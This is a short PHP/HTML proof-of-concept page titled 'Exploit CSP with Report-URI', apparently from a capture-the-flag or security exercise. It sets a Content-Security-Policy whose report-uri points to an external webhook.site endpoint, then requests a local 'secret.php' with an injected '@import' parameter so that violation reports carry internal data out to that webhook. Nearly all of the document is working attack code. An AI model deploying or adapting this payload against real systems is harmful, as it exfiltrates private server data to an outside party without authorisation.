<?php

header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/04b72cbe-5308-4e5c-9930-11d0629c7ee9;");


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit CSP with Report-URI</title>
    <link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import '">
</head>
<body>
    <h1>Exploitation in Progress...</h1>
</body>
</html>
